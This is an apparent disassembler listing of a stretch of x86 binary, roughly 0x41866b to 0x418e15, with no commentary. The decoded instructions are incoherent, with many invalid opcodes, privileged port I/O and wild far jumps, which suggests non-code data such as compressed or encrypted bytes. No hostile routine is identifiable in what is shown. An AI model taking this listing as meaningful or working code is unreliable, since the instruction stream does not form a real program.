  41866b:	inc    ecx
  41866c:	pop    ebx
  41866d:	or     BYTE PTR [esp+ebx*8+0x50986289],bh
  418674:	sbb    DWORD PTR [ebx-0xa],esi
  418677:	mov    cs,WORD PTR [ebp-0x10]
  41867a:	into   
  41867b:	leave  
  41867c:	pop    ebx
  41867d:	jmp    0x41afa5d0
  418682:	aam    0x53
  418684:	mov    bh,0xa0
  418686:	sbb    ebp,DWORD PTR [esi]
  418688:	pop    esi
  418689:	mov    esp,0xd30e972c
  41868e:	xor    al,0xf4
  418690:	add    al,0x8e
  418692:	inc    ebx
  418693:	sub    eax,0xac1db03
  418698:	mov    dl,0x80
  41869a:	hlt    
  41869b:	push   esp
  41869c:	pop    eax
  41869d:	push   eax
  41869e:	inc    edx
  41869f:	and    eax,ebx
  4186a1:	in     al,dx
  4186a2:	repz gs jmp 0x6c051a5b
  4186a9:	lods   al,BYTE PTR ds:[esi]
  4186aa:	cdq    
  4186ab:	gs mov bl,0x13
  4186ae:	pop    ebp
  4186af:	xor    al,0x3
  4186b1:	test   BYTE PTR [ecx-0x3f],bh
  4186b4:	jnp    0x4186d3
  4186b6:	sbb    al,0xf8
  4186b8:	mov    ah,0x52
  4186ba:	sub    al,0xf
  4186bc:	loopne 0x418655
  4186be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186bf:	shl    edx,1
  4186c1:	jnp    0xd09e8913
  4186c7:	inc    ecx
  4186c8:	and    ah,cl
  4186ca:	mov    edx,0x7f2191f6
  4186cf:	pop    ecx
  4186d0:	cld    
  4186d1:	xchg   esi,eax
  4186d2:	xchg   edi,eax
  4186d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186d4:	data16 test al,bl
  4186d7:	xchg   BYTE PTR [edx-0x1baf0288],cl
  4186dd:	cmp    ebx,edi
  4186df:	pushw  es
  4186e1:	loope  0x4186b0
  4186e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186e4:	dec    BYTE PTR [ebx]
  4186e6:	jmp    0xb1e8:0x716d56
  4186ed:	mov    edx,0xd4bad705
  4186f2:	clc    
  4186f3:	inc    esp
  4186f4:	daa    
  4186f5:	jbe    0x4186a6
  4186f7:	push   ss
  4186f8:	int3   
  4186f9:	mov    ah,0x7e
  4186fb:	add    bl,dl
  4186fd:	and    ebp,DWORD PTR gs:[esi]
  418700:	inc    ecx
  418701:	adc    eax,0x47a9408f
  418706:	sub    eax,0x50e7c3e7
  41870b:	xchg   edi,eax
  41870c:	cmp    ah,BYTE PTR [edi-0x25]
  41870f:	pop    ebx
  418710:	and    bl,BYTE PTR ds:0xda5a574a
  418716:	and    cl,BYTE PTR [edx+0xdb8e835]
  41871c:	pop    eax
  41871d:	daa    
  41871e:	sbb    BYTE PTR [esi],al
  418720:	(bad)  
  418721:	push   ds
  418722:	xor    al,0xee
  418724:	cmp    ebx,DWORD PTR [esi-0x5f0a7fad]
  41872a:	std    
  41872b:	inc    edx
  41872c:	jno    0x41878e
  41872e:	in     al,dx
  41872f:	jb     0x4186d3
  418731:	cmp    DWORD PTR [edi],esi
  418733:	fcom   DWORD PTR [edx]
  418735:	outs   dx,BYTE PTR ds:[esi]
  418736:	fld    TBYTE PTR [esi]
  418738:	adc    DWORD PTR [edi],edx
  41873a:	sbb    eax,0x214fa93a
  41873f:	inc    dl
  418741:	neg    BYTE PTR [esi+eiz*8]
  418744:	cld    
  418745:	fdiv   QWORD PTR [eax+0x4748db02]
  41874b:	sub    esp,esp
  41874d:	arpl   bx,di
  41874f:	pushf  
  418750:	mov    bl,0xf8
  418752:	push   ebx
  418753:	stos   DWORD PTR es:[edi],eax
  418754:	ins    BYTE PTR es:[edi],dx
  418755:	xor    cl,BYTE PTR [ebp+edi*4+0x66]
  418759:	out    dx,eax
  41875a:	mov    edi,0xff4d6e6b
  41875f:	(bad)
  418762:	sbb    eax,0x3a8a7ab3
  418767:	or     al,0xd
  418769:	les    eax,FWORD PTR [esi+0x74]
  41876c:	sub    DWORD PTR [ebx+esi*8-0x4],esp
  418770:	call   0x3156e2ad
  418775:	pop    ds
  418776:	jmp    ebp
  418778:	xlat   BYTE PTR ds:[ebx]
  418779:	xchg   ebp,eax
  41877a:	jmp    0x41877f
  41877c:	loopne 0x41875b
  41877e:	adc    bl,ch
  418780:	jne    0x4187fa
  418782:	jp     0x418768
  418784:	push   0x1ee5efb3
  418789:	pop    esi
  41878a:	inc    esp
  41878b:	les    ecx,FWORD PTR [ebp+0x64]
  41878e:	cmp    BYTE PTR [ebx],dl
  418790:	push   ds
  418791:	(bad)  [ebx-0x78]
  418794:	mov    bh,0x93
  418796:	dec    ebx
  418797:	jp     0x4187f7
  418799:	xor    DWORD PTR [ecx+0x55],ebp
  41879c:	cmp    al,0xee
  41879e:	inc    esi
  41879f:	mov    edx,0xf77ea824
  4187a4:	pop    ds
  4187a5:	and    esp,DWORD PTR [ebx+0x46]
  4187a8:	sub    al,0xf5
  4187aa:	cli    
  4187ab:	cs pop edx
  4187ad:	sbb    al,0x45
  4187af:	push   cs
  4187b0:	and    eax,0x51b68f29
  4187b5:	cmovnp ebx,edi
  4187b8:	cwde   
  4187b9:	arpl   WORD PTR [ecx+esi*1],bp
  4187bc:	push   esi
  4187bd:	inc    esi
  4187be:	retf   
  4187bf:	stc    
  4187c0:	xor    eax,0xcc27862a
  4187c5:	fist   DWORD PTR [eax-0x5b4a9367]
  4187cb:	sbb    DWORD PTR [edx],edx
  4187cd:	jl     0x418781
  4187cf:	mov    edx,0x6ff3cd59
  4187d4:	mov    gs,WORD PTR [esi-0x3c94bd8b]
  4187da:	cmp    BYTE PTR [ebx],ah
  4187dc:	addr16 push ss
  4187de:	inc    edx
  4187df:	jne    0x418803
  4187e1:	sti    
  4187e2:	loopne 0x418836
  4187e4:	mov    edx,esp
  4187e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e7:	jno    0x4187a1
  4187e9:	cmp    DWORD PTR [ecx-0x6f],edi
  4187ec:	jbe    0x41878d
  4187ee:	rol    BYTE PTR [esi-0x64b403e2],cl
  4187f4:	cmp    eax,0x39e54b5d
  4187f9:	and    eax,0xb0d0142c
  4187fe:	jmp    0xf08956e1
  418803:	adc    ebx,DWORD PTR [eax+0x7d]
  418806:	das    
  418807:	enter  0xe51,0x72
  41880b:	mov    esi,0x90f59dc0
  418810:	xor    DWORD PTR [edi],esp
  418812:	add    bh,ah
  418814:	arpl   WORD PTR [esi+esi*1+0x327e2f99],bp
  41881b:	adc    eax,0x701922b7
  418820:	int    0xfa
  418822:	xor    BYTE PTR [edi+eiz*1-0x29],cl
  418826:	leave  
  418827:	inc    edx
  418828:	push   eax
  418829:	lds    esp,FWORD PTR [ecx]
  41882b:	jns    0x418874
  41882d:	aas    
  41882e:	cli    
  41882f:	bound  edx,QWORD PTR [ecx-0x74]
  418832:	xlat   BYTE PTR ds:[ebx]
  418833:	dec    ecx
  418834:	shr    cl,1
  418836:	scas   eax,DWORD PTR es:[edi]
  418837:	sub    edx,ecx
  418839:	add    BYTE PTR [edi+0x1f5438b0],dl
  41883f:	rcr    esp,1
  418841:	sbb    eax,0x489407f8
  418846:	sbb    BYTE PTR [esp+ecx*2],bh
  418849:	loopne 0x418880
  41884b:	sub    al,BYTE PTR [ebp-0x1639fdca]
  418851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418852:	dec    esp
  418853:	nop
  418854:	cmp    DWORD PTR [ebx-0x45e267cb],eax
  41885a:	mov    ds:0xd9d754e3,eax
  41885f:	aas    
  418860:	iret   
  418861:	aam    0x60
  418863:	add    al,BYTE PTR ds:0x50d8b593
  418869:	add    DWORD PTR [edi+0x17],eax
  41886c:	ins    BYTE PTR es:[edi],dx
  41886d:	dec    esi
  41886e:	inc    ebp
  41886f:	push   ebp
  418870:	clc    
  418871:	in     al,0x63
  418873:	inc    eax
  418874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418875:	popa   
  418876:	adc    esp,DWORD PTR [ebx+0x170f84d]
  41887c:	test   eax,0x266d8c1f
  418881:	(bad)  
  418882:	in     al,dx
  418883:	outs   dx,BYTE PTR ds:[esi]
  418884:	pop    eax
  418885:	ret    0x23a4
  418888:	aam    0x52
  41888a:	(bad)  
  41888b:	push   esi
  41888c:	push   ds
  41888d:	ins    BYTE PTR es:[edi],dx
  41888e:	(bad)  
  41888f:	outs   dx,BYTE PTR ds:[esi]
  418890:	pop    ecx
  418891:	pushf  
  418892:	test   eax,0x300d85e8
  418897:	push   ebx
  418898:	jmp    0x418912
  41889a:	je     0x41881d
  41889c:	daa    
  41889d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41889e:	daa    
  41889f:	dec    ebp
  4188a0:	lock or eax,0xc62688f8
  4188a6:	dec    esp
  4188a7:	daa    
  4188a8:	add    esi,ebp
  4188aa:	xor    ebp,DWORD PTR [eax]
  4188ac:	push   ds
  4188ad:	fistp  DWORD PTR [edx-0x7faf8734]
  4188b3:	adc    al,ch
  4188b5:	repnz out 0x3,eax
  4188b8:	and    eax,0x54c5bcb4
  4188bd:	push   ebp
  4188be:	sbb    eax,0xd4f3f07f
  4188c3:	in     al,dx
  4188c4:	nop
  4188c5:	inc    ebx
  4188c6:	push   edx
  4188c7:	add    edx,esp
  4188c9:	stos   BYTE PTR es:[edi],al
  4188ca:	lods   eax,DWORD PTR ds:[esi]
  4188cb:	pusha  
  4188cc:	mov    esi,0x453b25ea
  4188d1:	jne    0x418870
  4188d3:	fisub  WORD PTR [eax]
  4188d5:	inc    esi
  4188d6:	jl     0x4188a4
  4188d8:	add    edx,DWORD PTR ds:0x14863c2c
  4188de:	jg     0x418942
  4188e0:	adc    al,0x20
  4188e2:	daa    
  4188e3:	and    esp,DWORD PTR [ecx-0x391673db]
  4188e9:	ins    DWORD PTR es:[edi],dx
  4188ea:	retf   
  4188eb:	js     0x4188ad
  4188ed:	mov    al,0x33
  4188ef:	sbb    bh,BYTE PTR gs:[ecx]
  4188f2:	scas   al,BYTE PTR es:[edi]
  4188f3:	pop    edi
  4188f4:	jae    0x4188ed
  4188f6:	mov    al,0x5f
  4188f8:	and    eax,0x4ae43db8
  4188fd:	lods   al,BYTE PTR ds:[si]
  4188ff:	or     esp,edi
  418901:	sbb    BYTE PTR [edx-0x63],ch
  418904:	sbb    eax,0xb6227cc8
  418909:	sar    DWORD PTR [edx+0x7f],cl
  41890c:	mov    ebx,0xbeafadfc
  418911:	les    edi,FWORD PTR [esi+0x4949b93b]
  418917:	mul    DWORD PTR [esi]
  418919:	sub    BYTE PTR [ecx+0x48],dl
  41891c:	or     BYTE PTR fs:[ebp-0x46],0x79
  418921:	push   edx
  418922:	mov    ds:0x3f39b951,al
  418927:	cs xor ebx,eax
  41892a:	push   edx
  41892b:	inc    esi
  41892c:	fsubr  DWORD PTR [edi+0x75fbf2a9]
  418932:	sbb    DWORD PTR [esi+0x3d],edi
  418935:	(bad)  
  418936:	xor    eax,0x2cd057fb
  41893b:	hlt    
  41893c:	fst    DWORD PTR [eax]
  41893e:	sar    BYTE PTR [eax],cl
  418940:	popf   
  418941:	mov    ds:0xe377a80a,eax
  418946:	jg     0x4188ee
  418948:	add    DWORD PTR [eax-0x5f],ebp
  41894b:	sbb    DWORD PTR [ebp-0x29],esp
  41894e:	and    eax,0x563838c9
  418953:	in     eax,dx
  418954:	popf   
  418955:	xor    dh,BYTE PTR [ecx+0x3c8e1b9b]
  41895b:	mov    dh,0x35
  41895d:	jbe    0x41899e
  41895f:	ja     0x4188e8
  418961:	xchg   esi,eax
  418962:	jmp    0x41892d
  418964:	add    BYTE PTR [ebx-0x62],ch
  418967:	add    DWORD PTR [ebp+0x2e921dc3],ebx
  41896d:	fistp  DWORD PTR [ebx]
  41896f:	push   esp
  418970:	aaa    
  418971:	jg     0x418990
  418973:	mov    esi,0xc6ecfeed
  418978:	loop   0x418918
  41897a:	pop    eax
  41897b:	mov    DWORD PTR [esi],ebp
  41897d:	xchg   esi,eax
  41897e:	adc    esp,esp
  418980:	add    eax,0x32a308cc
  418985:	ds dec esi
  418987:	pop    esp
  418988:	mov    BYTE PTR [edx+0x27c9ed9],bl
  41898e:	bnd jle 0x418999
  418991:	mov    ds:0x1f301187,al
  418996:	or     eax,0x6dcc4f3
  41899b:	and    al,0x94
  41899d:	and    dl,BYTE PTR [esi+0x7c]
  4189a0:	mov    ecx,0xadfeccf0
  4189a5:	cld    
  4189a6:	adc    DWORD PTR [ecx+0x6ba8f2d7],edx
  4189ac:	adc    bh,BYTE PTR [ecx+ebx*4+0x540b524d]
  4189b3:	jecxz  0x4189e2
  4189b5:	test   BYTE PTR ds:0xa7bd0e8,0x88
  4189bc:	hlt    
  4189bd:	mov    al,ds:0x5ab485f1
  4189c2:	loope  0x4189a5
  4189c4:	repz mov eax,ds:0x3a4423a8
  4189ca:	data16 sub BYTE PTR [ecx-0x37dfd2b4],al
  4189d1:	pop    ebp
  4189d2:	dec    edi
  4189d3:	neg    ebx
  4189d5:	aas    
  4189d6:	in     al,dx
  4189d7:	or     DWORD PTR [esi+0x3986763c],ecx
  4189dd:	jge    0x4189cc
  4189df:	dec    BYTE PTR [ebp+0x4d958b54]
  4189e5:	lods   al,BYTE PTR ds:[esi]
  4189e6:	and    BYTE PTR [ecx+0x6ef62291],al
  4189ec:	jns    0x4189af
  4189ee:	sti    
  4189ef:	ss adc al,0xb5
  4189f2:	xor    DWORD PTR [eax-0x31d3ebc4],ebp
  4189f8:	(bad)  
  4189f9:	inc    DWORD PTR [esi-0x4f]
  4189fc:	adc    al,BYTE PTR [edi+eiz*2]
  4189ff:	int3   
  418a00:	pushf  
  418a01:	xchg   ebp,eax
  418a02:	test   DWORD PTR [ebp+0x2c],eax
  418a05:	push   cs
  418a06:	fsub   DWORD PTR [ecx]
  418a08:	push   cs
  418a09:	mov    ebp,0x7bd8362
  418a0e:	gs xchg dh,al
  418a11:	adc    BYTE PTR [edx+0x70e314f5],dh
  418a17:	mov    edx,0x53a68dc9
  418a1c:	das    
  418a1d:	cmp    edi,eax
  418a1f:	aaa    
  418a20:	out    dx,eax
  418a21:	add    al,0xec
  418a23:	(bad)  
  418a24:	dec    esi
  418a25:	aam    0xf8
  418a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a28:	bswap  edx
  418a2a:	push   esi
  418a2b:	push   ebp
  418a2c:	mov    DWORD PTR [eax+0x6f9d87d3],esi
  418a32:	mov    ch,0xf0
  418a34:	add    dl,bl
  418a36:	or     ah,bl
  418a38:	jb     0x418a67
  418a3a:	add    esp,ecx
  418a3c:	add    eax,0xf489bb64
  418a41:	aam    0x7
  418a43:	push   ds
  418a44:	and    bh,BYTE PTR fs:[edx-0x11]
  418a48:	ins    BYTE PTR es:[edi],dx
  418a49:	mov    ebx,0x9c738ea
  418a4e:	aas    
  418a4f:	mov    eax,ds:0x84c1e9b4
  418a54:	mov    eax,ds:0x6c39a604
  418a59:	fisttp QWORD PTR [ebp-0x16]
  418a5c:	jge    0x4189f9
  418a5e:	xor    esi,esi
  418a60:	pop    ss
  418a61:	mov    al,0x1b
  418a63:	mov    ds:0xc92b8e9,al
  418a68:	clc    
  418a69:	add    esi,DWORD PTR [edi]
  418a6b:	push   0xffffffaf
  418a6d:	cmp    BYTE PTR [edx],ch
  418a6f:	jle    0x418a39
  418a71:	adc    dh,BYTE PTR ds:0xad342d27
  418a77:	pop    ebp
  418a78:	data16 fmul DWORD PTR [ecx+0x78]
  418a7c:	in     al,0x89
  418a7e:	pop    edi
  418a7f:	pop    ebp
  418a80:	lahf   
  418a81:	mov    ebx,0x205f3621
  418a86:	jns    0x418a7c
  418a88:	add    BYTE PTR [esp+edx*4+0x6a],0x2b
  418a8d:	xor    DWORD PTR [esi+ecx*4-0x1b],0x9ed3b4df
  418a95:	jbe    0x418a47
  418a97:	(bad)  
  418a98:	mov    ecx,0xda3b195c
  418a9d:	mov    esi,DWORD PTR [ebp+eiz*8-0x3e9c86ec]
  418aa4:	jne    0x418af4
  418aa6:	(bad)  
  418aa7:	pop    es
  418aa8:	outs   dx,DWORD PTR ds:[esi]
  418aa9:	sbb    eax,0x36839268
  418aae:	dec    ebp
  418aaf:	or     bh,BYTE PTR [ebp+0x28]
  418ab2:	sub    al,0x9f
  418ab4:	sahf   
  418ab5:	cmp    DWORD PTR [eax+eax*8-0x58],edx
  418ab9:	inc    ecx
  418aba:	xchg   ecx,eax
  418abb:	push   esp
  418abc:	into   
  418abd:	or     BYTE PTR [edx],bh
  418abf:	jne    0x418a87
  418ac1:	repnz adc cl,bh
  418ac4:	icebp  
  418ac5:	shl    DWORD PTR [eax+edi*1-0xa9b2a3f],cl
  418acc:	or     eax,DWORD PTR [eax+0x761e0513]
  418ad2:	adc    al,0xcf
  418ad4:	int3   
  418ad5:	xor    cl,BYTE PTR [edx+eiz*8]
  418ad8:	in     eax,0x14
  418ada:	js     0x418a8f
  418adc:	mov    bl,0x5a
  418ade:	push   es
  418adf:	sub    eax,0x9823bf5c
  418ae4:	push   ecx
  418ae5:	in     eax,dx
  418ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ae7:	shr    dl,1
  418ae9:	in     eax,0x10
  418aeb:	xchg   ecx,eax
  418aec:	push   cs
  418aed:	pop    esp
  418aee:	jbe    0x418af4
  418af0:	lea    esi,[edi]
  418af2:	sub    BYTE PTR [ebp-0x79],bh
  418af5:	neg    BYTE PTR [ebp-0x5f5ea204]
  418afb:	dec    ecx
  418afc:	outs   dx,DWORD PTR ds:[esi]
  418afd:	das    
  418afe:	loope  0x418a84
  418b00:	fsubr  st(7),st
  418b02:	out    0xca,al
  418b04:	push   ebp
  418b05:	mov    ebx,0xb7e3385b
  418b0a:	xor    eax,0xd9f1dbea
  418b0f:	aaa    
  418b10:	lods   al,BYTE PTR ds:[esi]
  418b11:	mov    bl,bh
  418b13:	sub    esi,esi
  418b15:	xor    ch,dh
  418b17:	scas   al,BYTE PTR es:[edi]
  418b18:	xchg   esi,eax
  418b19:	push   esp
  418b1a:	sbb    eax,0xc3401cc2
  418b1f:	dec    eax
  418b20:	outs   dx,BYTE PTR ds:[esi]
  418b21:	push   eax
  418b22:	xchg   esp,eax
  418b23:	xchg   edi,edi
  418b25:	jb     0x418b18
  418b27:	inc    esp
  418b28:	pusha  
  418b29:	je     0x418afc
  418b2b:	dec    ecx
  418b2c:	xor    cl,dh
  418b2e:	add    eax,DWORD PTR [ebx+edx*4]
  418b31:	pushf  
  418b32:	outs   dx,BYTE PTR ds:[esi]
  418b33:	cmc    
  418b34:	jb     0x418b52
  418b36:	ins    BYTE PTR es:[edi],dx
  418b37:	out    0xd3,eax
  418b39:	sbb    bh,BYTE PTR [edi+0x48c421f]
  418b3f:	test   BYTE PTR [edx],al
  418b41:	gs daa 
  418b43:	or     eax,0x4ed82dac
  418b48:	gs mov ch,0xf2
  418b4b:	jg     0x418af3
  418b4d:	jecxz  0x418b66
  418b4f:	mov    al,0x86
  418b51:	mov    al,0x98
  418b53:	pop    ebx
  418b54:	(bad)  
  418b55:	pop    esp
  418b56:	repnz into 
  418b58:	dec    ebx
  418b59:	cmc    
  418b5a:	fdivrp st(4),st
  418b5c:	sub    BYTE PTR [esp+eiz*4-0x35f5657a],ch
  418b63:	scas   al,BYTE PTR es:[edi]
  418b64:	xor    DWORD PTR [ecx+edi*4+0x6b],ecx
  418b68:	out    dx,eax
  418b69:	mov    ds:0x3922839c,al
  418b6e:	stos   BYTE PTR es:[edi],al
  418b6f:	mov    eax,0x6666d36d
  418b74:	retf   0x280d
  418b77:	push   esp
  418b78:	jbe    0x418bf0
  418b7a:	fcomp  QWORD PTR [esi+ebp*4+0x26309264]
  418b81:	push   ebp
  418b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b83:	mov    ch,0x7f
  418b85:	les    esp,FWORD PTR [esp+edi*2]
  418b88:	imul   ecx,DWORD PTR [ecx+0x4b0c26c3],0x2436f3f5
  418b92:	xor    dl,BYTE PTR [esi+0x29802e0f]
  418b98:	fcom   DWORD PTR [ecx]
  418b9a:	in     eax,dx
  418b9b:	(bad)  
  418b9c:	pop    ebx
  418b9d:	push   es
  418b9e:	xor    eax,0xee6f0961
  418ba3:	(bad)  
  418ba4:	push   eax
  418ba5:	xchg   edi,eax
  418ba6:	sbb    dl,al
  418ba8:	jb     0x418bec
  418baa:	neg    BYTE PTR [ecx+0x19d7e982]
  418bb0:	leave  
  418bb1:	xor    BYTE PTR [esi],0x54
  418bb4:	or     al,BYTE PTR [ebp-0x6e]
  418bb7:	mov    al,0x2d
  418bb9:	dec    edx
  418bba:	push   ebp
  418bbb:	cwde   
  418bbc:	ds cli 
  418bbe:	shr    BYTE PTR [edi-0x335045eb],1
  418bc4:	adc    al,0x87
  418bc6:	cmp    esp,DWORD PTR [esi+0x5a]
  418bc9:	inc    ebx
  418bca:	push   ebp
  418bcb:	inc    ebp
  418bcc:	inc    ebp
  418bcd:	sbb    DWORD PTR [ebp-0x72],0x79
  418bd1:	mul    DWORD PTR [edi+0x78f9776a]
  418bd7:	adc    eax,0x8f12df8
  418bdc:	inc    esp
  418bdd:	mov    dh,0x7b
  418bdf:	loop   0x418c2f
  418be1:	lods   eax,DWORD PTR ds:[esi]
  418be2:	push   ss
  418be3:	es ret 0x1ebe
  418be7:	outs   dx,BYTE PTR ds:[esi]
  418be8:	cmp    dl,BYTE PTR [ecx-0x7]
  418beb:	jbe    0x418c65
  418bed:	jmp    0x6058:0xc0cdde41
  418bf4:	or     eax,DWORD PTR [edx]
  418bf6:	gs inc eax
  418bf8:	(bad)
  418bfc:	inc    esp
  418bfd:	or     al,0xb0
  418bff:	xchg   DWORD PTR [ebp-0x6a0b7295],esi
  418c05:	dec    eax
  418c06:	shl    DWORD PTR [ebp+0x72],0x73
  418c0a:	dec    eax
  418c0b:	jmp    0x418c16
  418c0d:	iret   
  418c0e:	daa    
  418c0f:	push   cs
  418c10:	dec    esp
  418c11:	scas   eax,DWORD PTR es:[edi]
  418c12:	or     al,0x94
  418c14:	push   ecx
  418c15:	sbb    al,0xec
  418c17:	sti    
  418c18:	jne    0x418c4c
  418c1a:	jne    0x418bae
  418c1c:	mov    dh,0x23
  418c1e:	mov    ch,0x42
  418c20:	inc    edx
  418c21:	addr16 sub eax,0xc8a997b2
  418c27:	sbb    edx,DWORD PTR [ebp-0x1b9521fb]
  418c2d:	(bad)  
  418c2f:	ds in  eax,dx
  418c31:	mov    cl,0x7
  418c33:	or     eax,0x1eb95262
  418c38:	scas   eax,DWORD PTR es:[edi]
  418c39:	data16 (bad) 
  418c3b:	sbb    edx,DWORD PTR [ebx-0x431d2a34]
  418c41:	mov    al,ds:0xef35edb3
  418c46:	jns    0x418c51
  418c48:	and    eax,DWORD PTR [ebx]
  418c4a:	retf   
  418c4b:	pop    ss
  418c4c:	push   ss
  418c4d:	es sub ecx,ecx
  418c50:	in     eax,0x2b
  418c52:	cmp    al,0x41
  418c54:	fs (bad) 
  418c56:	sbb    DWORD PTR [eax+0x71],edx
  418c59:	jb     0x418c9c
  418c5b:	hlt    
  418c5c:	data16 ja 0x418c5a
  418c5f:	adc    DWORD PTR [ecx],ebp
  418c61:	mov    ebx,0xdbebf0b2
  418c66:	mov    ecx,0x27310c7d
  418c6b:	cmc    
  418c6c:	xchg   BYTE PTR [ecx],al
  418c6e:	mov    ah,dl
  418c70:	jns    0x418bfb
  418c72:	mov    DWORD PTR [ebx],eax
  418c74:	jecxz  0x418c5e
  418c76:	dec    ebp
  418c77:	pusha  
  418c78:	push   ebp
  418c79:	jae    0x418cd4
  418c7b:	xor    eax,0xec27ab16
  418c80:	pushf  
  418c81:	and    eax,0x56db17e
  418c86:	scas   al,BYTE PTR es:[edi]
  418c87:	sbb    edi,esi
  418c89:	or     al,0xe0
  418c8b:	dec    esp
  418c8c:	cmp    edi,DWORD PTR [esi-0x20a5493c]
  418c92:	test   ax,0xc1f
  418c96:	mov    ds:0x5a3a604e,al
  418c9b:	stos   BYTE PTR es:[edi],al
  418c9c:	cld    
  418c9d:	shr    BYTE PTR [edi-0x67],0xfd
  418ca1:	loope  0x418cc9
  418ca3:	xchg   BYTE PTR [esp+ebp*2],al
  418ca6:	and    BYTE PTR [edx],cl
  418ca8:	mov    DWORD PTR [esi-0x44],edi
  418cab:	or     ecx,DWORD PTR [esi-0x63]
  418cae:	or     DWORD PTR [esp+eax*2],ecx
  418cb1:	cmp    DWORD PTR [esp+eiz*4-0x2df8611e],0x7aacf3e
  418cbc:	scas   al,BYTE PTR es:[edi]
  418cbd:	inc    ebp
  418cbe:	enter  0xf91b,0xd5
  418cc2:	push   esi
  418cc3:	clc    
  418cc4:	mov    ecx,0x455df19a
  418cc9:	or     DWORD PTR [ebp-0x3],ecx
  418ccc:	xchg   DWORD PTR [esi],esi
  418cce:	enter  0x47fb,0xa6
  418cd2:	jmp    0x287e:0x53d3051e
  418cd9:	in     al,0xe
  418cdb:	ins    BYTE PTR es:[edi],dx
  418cdc:	add    DWORD PTR [edx-0x5273ae20],esi
  418ce2:	mov    ?,ebp
  418ce4:	inc    edx
  418ce5:	mov    WORD PTR [edi],ss
  418ce7:	cwde   
  418ce8:	arpl   WORD PTR [esp+edx*8],si
  418ceb:	(bad)  
  418ced:	adc    ecx,DWORD PTR ds:0xd3299264
  418cf3:	and    DWORD PTR [esp+edx*4+0x6871d858],edi
  418cfa:	aaa    
  418cfb:	fist   WORD PTR [edx]
  418cfd:	aad    0xe7
  418cff:	mov    dh,0xcf
  418d01:	test   BYTE PTR [eax-0x5d],dl
  418d04:	xchg   ecx,eax
  418d05:	pop    eax
  418d06:	cmp    ch,BYTE PTR [edx-0x6a]
  418d09:	push   eax
  418d0a:	call   0x21ac70d3
  418d0f:	push   esi
  418d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d11:	sbb    BYTE PTR [ebp+0x4a],0xef
  418d15:	cmp    al,0x25
  418d17:	adc    esp,edi
  418d19:	sbb    ebx,DWORD PTR [ebp-0x54cd7feb]
  418d1f:	mov    ecx,0xbae8f092
  418d24:	jle    0x418d44
  418d26:	push   esi
  418d27:	stc    
  418d28:	lock outs dx,BYTE PTR ds:[esi]
  418d2a:	iret   
  418d2b:	fisub  DWORD PTR [esi-0x39f89315]
  418d31:	outs   dx,BYTE PTR ds:[esi]
  418d32:	xchg   ecx,eax
  418d33:	jae    0x418d5e
  418d35:	pop    eax
  418d36:	mov    esp,0xe2e1f838
  418d3b:	adc    BYTE PTR [ecx],cl
  418d3d:	sbb    ecx,DWORD PTR [edi+eax*1-0x41]
  418d41:	xchg   ebx,eax
  418d42:	mov    WORD PTR [ebx-0x150c8fc3],?
  418d48:	data16 clc 
  418d4a:	jecxz  0x418d41
  418d4c:	add    al,0x1f
  418d4e:	add    BYTE PTR [edx-0xe],0x94
  418d52:	dec    edi
  418d53:	sub    al,0xcc
  418d55:	lds    ebp,FWORD PTR [ebx+0x18]
  418d58:	pop    esi
  418d59:	repz sbb eax,0x5e32bb39
  418d5f:	adc    eax,0x14454d54
  418d64:	ss and al,0xef
  418d67:	fld    QWORD PTR [ecx+0x5a]
  418d6a:	xchg   esp,eax
  418d6b:	push   ebp
  418d6c:	push   es
  418d6d:	es (bad) 
  418d6f:	jns    0x418cf1
  418d71:	ss retf 
  418d73:	adc    eax,0x275a7182
  418d78:	cwde   
  418d79:	mov    DWORD PTR ds:0x526677d7,eax
  418d7f:	lds    edi,FWORD PTR [esi+0x6d8cedab]
  418d85:	pop    sp
  418d87:	xchg   BYTE PTR [edi],dh
  418d89:	jmp    0x418d47
  418d8b:	int3   
  418d8c:	jns    0x418da5
  418d8e:	loope  0x418dcd
  418d90:	aaa    
  418d91:	mov    ebx,0xfebb8127
  418d96:	nop
  418d97:	jmp    0xf6fecaa3
  418d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d9d:	mov    BYTE PTR [esi+0x32],ch
  418da0:	sub    eax,esi
  418da2:	mov    WORD PTR ds:0x34922f78,?
  418da8:	jl     0x418dc1
  418daa:	fwait
  418dab:	ret    
  418dac:	into   
  418dad:	and    edi,DWORD PTR [eax]
  418daf:	ret    0x9c1f
  418db2:	sar    esi,0x6e
  418db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418db6:	mov    ebx,0x9ab50d6a
  418dbb:	jmp    0xcde6a00a
  418dc0:	sbb    edi,DWORD PTR [edx]
  418dc2:	jnp    0x418e37
  418dc4:	gs xchg edi,eax
  418dc6:	mov    ds:0xf5767d60,eax
  418dcb:	in     al,dx
  418dcc:	jne    0x418e0a
  418dce:	cmp    ecx,esi
  418dd0:	jb     0x418de8
  418dd2:	jge    0x418d78
  418dd4:	mov    BYTE PTR [ecx],dl
  418dd6:	rcl    DWORD PTR [ebx-0x17076580],cl
  418ddc:	(bad)  
  418ddd:	push   ebx
  418dde:	(bad)  
  418ddf:	bound  ebp,QWORD PTR [eax+0x12]
  418de2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418de4:	std    
  418de5:	cs aas 
  418de7:	push   ecx
  418de8:	imul   ebp,DWORD PTR ss:[edx+0x6571b3d7],0xffffffe6
  418df0:	mov    eax,0x7dc75464
  418df5:	fcomp  QWORD PTR [esi-0x2e32b2a3]
  418dfb:	out    0x89,eax
  418dfd:	aas    
  418dfe:	clc    
  418dff:	push   cs
  418e00:	or     BYTE PTR [edx+0x5bb074f3],bh
  418e06:	cmp    eax,0xf3a4a814
  418e0b:	les    ecx,FWORD PTR [edx]
  418e0d:	add    DWORD PTR [ebx+0x3163b00d],eax
  418e13:	add    esp,edx
  418e15:	mov    ecx,0xb20ac9ed
